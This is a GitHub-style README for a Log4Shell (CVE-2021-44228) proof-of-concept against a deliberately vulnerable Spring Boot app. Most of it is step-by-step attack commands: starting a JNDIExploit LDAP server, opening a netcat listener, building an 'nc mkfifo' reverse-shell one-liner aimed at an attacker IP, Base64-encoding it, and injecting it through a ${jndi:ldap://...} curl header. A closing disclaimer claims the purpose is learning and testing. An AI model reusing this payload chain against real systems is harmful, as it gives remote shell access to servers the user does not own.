# LOg4j

A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.

Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.

## Proof-of-concept (POC)

#### Step 1 : Run Docker File which Include SpringBoot Vulnerable Application

```bash
cd log4shell-vulnerable-app
sudo docker run --rm -it -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
cd ..
```

#### Step 2 : Run the LDAP Server and Http Server

```bash
cd Log4shell_JNDIExploit
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <Your Attacking Machine IP>
```

#### Step 3 : Run the netcat Listner where you get reverse shell

```bash
nc -lvp <Port you want for Listner>
```

#### Step 4 Curl the Application with Malicious Code

```bash
[+] Step 1 : goto https://ssl-proxy.my-addr.org/myaddrproxy.php/https/www.revshells.com/
[+] Step 2 : Enter your Attacking Machine IP and Netcat Port which you have used before
[+] Step 3 : Select nc mkfifo in shell Type
[+] Step 4 : Copy the command which look like "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.119.21.67 1188 >/tmp/f"
[+] Step 5 : goto https://gchq.github.io/CyberChef/
[+] Step 6 : Select To Base64 and Enter "A-Za-z0-9-_" in Alphabet
[+] Step 7 : Paste the command you had copied from Reverse Shell Generator and Paste it in Input Box
[+] Step 8 : Copy the String from the Output box that is the Base64 encoding of the Malicious Command which will lead you to Remote shell
[+] Step 9 : Form a Curl request in this manner ⇩
    curl -H 'X-Api-Version: ${jndi:ldap://<Attacking Machine IP>:1389/Basic/Command/Base64/<Base64 Command you just copied Step 8>}' http://localhost:8080
```

## Disclaimer

This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: https://log4shell.tools/).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.

## Reference
#### All Credits goes to the Developer
[log4shell-vulnerable-app] by christophetd</br>
[Log4shell_JNDIExploit] re-uploaded by black9

[log4shell-vulnerable-app]: https://github.com/christophetd/log4shell-vulnerable-app
[log4shell_jndiexploit]: https://github.com/black9/Log4shell_JNDIExploit.git
